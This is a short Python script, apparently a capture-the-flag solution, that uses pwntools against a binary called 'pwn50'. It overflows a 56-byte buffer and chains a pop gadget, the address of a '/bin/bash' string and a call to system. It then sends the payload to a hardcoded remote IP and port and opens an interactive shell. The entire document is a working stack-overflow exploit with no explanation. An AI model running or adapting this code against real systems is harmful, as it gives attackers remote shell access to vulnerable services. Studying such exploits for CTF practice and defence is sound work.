from pwn import *

elf=ELF('pwn50')
pop_ret=0x400743
call_system=0x4006c9
binsh=elf.search('/bin/bash').next()

pay="A"*48+"B"*8
pay+=p64(pop_ret)
pay+=p64(binsh)
pay+=p64(call_system)

r=remote('54.67.102.66','5251')
r.send(pay)
r.interactive()
